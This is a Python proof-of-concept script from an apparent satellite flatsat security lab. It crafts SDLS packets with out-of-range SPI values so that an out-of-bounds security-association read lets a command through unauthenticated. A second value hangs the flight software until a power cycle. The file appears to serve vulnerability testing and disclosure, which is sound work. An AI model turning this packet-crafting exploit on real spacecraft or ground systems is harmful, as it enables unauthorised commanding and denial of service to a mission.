#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-09  Unbounded SPI: index 8327 is out of the 64-entry SA table ->
# out-of-bounds read class (CVE-2024-44911/44910/44912 analogue) still
# 'passes'; SPI 9000 hits a fault address and HANGS the worker forever
# (no watchdog -> power cycle needed).
# SPARTA: CO-0004.02 / IM-0001 (availability)
def sec(spi):
    body = fs.aes_ecb_encrypt_wrap(fs.LINK_KEY, b"")
    sec = struct.pack(">HI", spi, 1)
    data = sec + b"\x00" * 16 + body
    hdr = fs.spp_pack(0x01, data, 1, sechdr=1)[:6]
    mac = fs.cmac(bytes(16), hdr + body)
    return fs.spp_pack(0x01, sec + mac + body, 1, sechdr=1)

def main(dev, ev):
    dev.tc(0x15, bytes([1, 16, 5]), via="usb")       # SDLS ON
    r = dev._decode_all(dev._xfer(sec(8327), "radio"))
    ev.log(f"SPI=8327 (beyond table): frames back = {bool(r)} "
           f"-> OOB entry read as Clear, command executed")
    check(dev.find(r, 0x01), "OOB SPI passes (unbounded index)")
    r = dev._decode_all(dev._xfer(sec(9000), "radio"))
    check(not r and (dev.silent if dev.hw
                     else dev.sim.state == "HANGED"),
          "SPI 9000 hangs the worker")
    ev.log("device silent after SPI fault (state HANGED)"
           if not dev.hw else "device silent after SPI fault (usb: no response)")
    dev.advance(30000)
    check(not dev.tc(0x01, b"", via="radio"), "still hung after 30 s")
    dev.powercycle()
    check(dev.find(dev.tc(0x01, b"", via="radio"), 0x01),
          "only power cycle recovers -> 3-minute mission window lost")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-09 unbounded SPI: OOB pass / hang DoS", main))
